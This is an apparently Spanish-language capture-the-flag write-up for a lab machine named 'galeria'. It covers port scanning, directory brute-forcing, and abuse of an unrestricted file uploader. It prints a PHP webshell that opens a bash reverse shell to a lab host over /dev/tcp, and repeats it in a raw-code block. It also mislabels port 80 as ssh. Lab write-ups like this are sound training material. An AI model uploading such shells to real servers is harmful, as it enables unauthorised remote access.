# galeria - Writeup

## Resumen

## Paso N1: Reconocimiento
Empezamos escaneando los puertos TCP disponibles con sus respectivos servicios y versiones
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
```
<img width="671" height="539" alt="image" src="https://github.com/user-attachments/assets/447475d5-e276-4272-9aa4-86ea6ed82a6d" />

Veremos que están abiertos los puertos 21 y 80 correspondientes respectivamente a ftp y ssh
**Nota del creador:** En esta máquina personalmente no hago uso del servidor ftp, pero es recomendable entrar y experimentar para desarrollar lógica y criterio propio.

## Paso N2: Búsqueda de subdirectorios
La página veremos que es una galería de fotos, no hay pistas ni credenciales sueltas, por lo que procederemos con la búsqueda de subdirectorios. 
```
gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html
```
<img width="672" height="523" alt="image" src="https://github.com/user-attachments/assets/02217a10-19cb-4ec0-ac73-8ced14da7844" />

Veremos que está disponible el subdirectorio `/gallery/` el cuál es un **Directory Listing** y que explorando un poco, llegaremos a `handler.php`, el cual al entrar veremos que nos permite subir un archivo.

## Paso N3: Explotando el file uploader
crearemos un pequeño script en `php` el cual al ejecutarse se refleje una reverse shell.
```
echo "<?php                
system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
?>" > script.php
```




raw code
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://172.17.0.2/ -x php,html


--- php ---
<?php
system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
?>
---




```
